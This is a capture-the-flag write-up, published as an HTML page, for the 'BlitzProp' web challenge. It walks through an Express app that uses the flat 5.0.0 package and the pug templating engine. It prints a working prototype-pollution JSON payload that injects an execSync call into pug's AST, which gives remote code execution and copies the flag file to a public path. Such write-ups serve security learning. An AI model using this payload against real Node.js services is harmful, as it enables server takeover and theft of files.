@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Blitzprop</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav id="load-navbar"></nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <div id="tags">
+        <h5>Tags</h5>
+        <ul>
+            <li>prototype pollution</li>
+            <li>AST</li>
+            <li>express.js</li>
+            <li>flat 5.0.0</li>
+            <li>RCE</li>
+        </ul>
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="BlitzProp_0"></a>BlitzProp</h1>
+<h2 class="code-line" data-line-start=1 data-line-end=2><a id="Description_1"></a>Description</h2>
+<p class="has-line-data" data-line-start="2" data-line-end="3">A tribute page for the legendary alien band called BlitzProp!</p>
+<h2 class="code-line" data-line-start=4 data-line-end=5><a id="Files_4"></a>Files</h2>
+<p class="has-line-data" data-line-start="5" data-line-end="6">Provided docker environment.</p>
+<h2 class="code-line" data-line-start=7 data-line-end=8><a id="Looking_around_7"></a>Looking around</h2>
+<p class="has-line-data" data-line-start="8" data-line-end="9">On the main page, we can submit our favourite song from these four choices. From the names we can take hints like <code>Polluting</code> and <code>AST</code>.</p>
+<p class="has-line-data" data-line-start="10" data-line-end="11"><img src="./page.PNG" alt="page"></p>
+<h2 class="code-line" data-line-start=12 data-line-end=13><a id="Code_12"></a>Code</h2>
+<h3 class="code-line" data-line-start=14 data-line-end=15><a id="routesindexjs_14"></a><code>routes/index.js</code></h3>
+<pre><code class="has-line-data" data-line-start="16" data-line-end="40" class="language-js"><span class="hljs-keyword">const</span> path              = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
+<span class="hljs-keyword">const</span> express           = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
+<span class="hljs-keyword">const</span> pug               = <span class="hljs-built_in">require</span>(<span class="hljs-string">'pug'</span>);
+<span class="hljs-keyword">const</span> { unflatten }     = <span class="hljs-built_in">require</span>(<span class="hljs-string">'flat'</span>);
+<span class="hljs-keyword">const</span> router            = express.Router();
+
+router.get(<span class="hljs-string">'/'</span>, (req, res) =&gt; {
+    <span class="hljs-keyword">return</span> res.sendFile(path.resolve(<span class="hljs-string">'views/index.html'</span>));
+});
+
+router.post(<span class="hljs-string">'/api/submit'</span>, (req, res) =&gt; {
+    <span class="hljs-keyword">const</span> { song } = unflatten(req.body);
+
+        <span class="hljs-keyword">if</span> (song.name.includes(<span class="hljs-string">'Not Polluting with the boys'</span>) || song.name.includes(<span class="hljs-string">'ASTa la vista baby'</span>) || song.name.includes(<span class="hljs-string">'The Galactic Rhymes'</span>) || song.name.includes(<span class="hljs-string">'The Goose went wild'</span>)) {
+                <span class="hljs-keyword">return</span> res.json({
+                        <span class="hljs-string">'response'</span>: pug.compile(<span class="hljs-string">'span Hello #{user}, thank you for letting us know!'</span>)({ user:<span class="hljs-string">'guest'</span> })
+                });
+        } <span class="hljs-keyword">else</span> {
+                <span class="hljs-keyword">return</span> res.json({
+                        <span class="hljs-string">'response'</span>: <span class="hljs-string">'Please provide us with the name of an existing song.'</span>
+                });
+        }
+});
+</code></pre>
+<h2 class="code-line" data-line-start=41 data-line-end=42><a id="Methodology_41"></a>Methodology</h2>
+<p class="has-line-data" data-line-start="42" data-line-end="43">We have to include a song name in <code>/api/submit</code> request, but we are not restricted with adding our own objects into <code>JSON</code>. We also use <code>pug</code> as templating engine. Also the request body is <code>unflatten</code> using <code>flat</code> package. From <code>package.json</code> we get the version.</p>
+<pre><code class="has-line-data" data-line-start="45" data-line-end="51" class="language-json">"dependencies": {
+    "express": "^4.17.1",
+    "flat": "5.0.0",
+    "pug": "^3.0.0"
+}
+</code></pre>
+<p class="has-line-data" data-line-start="52" data-line-end="53">Version <code>5.0.0</code> is vulnerable (<a href="https://github.com/hughsk/flat/issues/105">flat-bug</a>) to prototype pollution. There is an excellent writeup on <code>AST, Prototype pollution</code> and <code>pug</code> with provided payload to exploit this vulenrability (<a href="https://blog.p6.is/AST-Injection/#Example-1">exploit-writeup</a>).</p>
+<h2 class="code-line" data-line-start=54 data-line-end=55><a id="Exploit_54"></a>Exploit</h2>
+<p class="has-line-data" data-line-start="55" data-line-end="56">We are going to use <code>RCE</code> to write the flag in a file that can be reached from the browser.</p>
+<p class="has-line-data" data-line-start="57" data-line-end="58"><img src="./burp.PNG" alt="burp"></p>
+<pre><code class="has-line-data" data-line-start="60" data-line-end="68" class="language-json">{
+    "<span class="hljs-attribute">song.name</span>":<span class="hljs-value"><span class="hljs-string">"ASTa la vista baby"</span></span>,
+    "<span class="hljs-attribute">__proto__.block</span>": <span class="hljs-value">{
+        "<span class="hljs-attribute">type</span>": <span class="hljs-value"><span class="hljs-string">"Text"</span></span>, 
+        "<span class="hljs-attribute">line</span>": <span class="hljs-value"><span class="hljs-string">"process.mainModule.require('child_process').execSync(`cat /app/flag* &gt; /app/static/js/flag.txt`)"</span>
+    </span>}
+</span>}
+</code></pre>
+<p class="has-line-data" data-line-start="69" data-line-end="70">Result</p>
+<p class="has-line-data" data-line-start="71" data-line-end="72"><img src="./flag.PNG" alt="flag"></p>
+<h2 class="code-line" data-line-start=73 data-line-end=74><a id="Flag_73"></a>Flag</h2>
+<p class="has-line-data" data-line-start="74" data-line-end="75"><strong>CHTB{p0llute_with_styl3}</strong></p>
+
+    <script src="/js/navbar.js"></script>
+</body>
+
+</html>
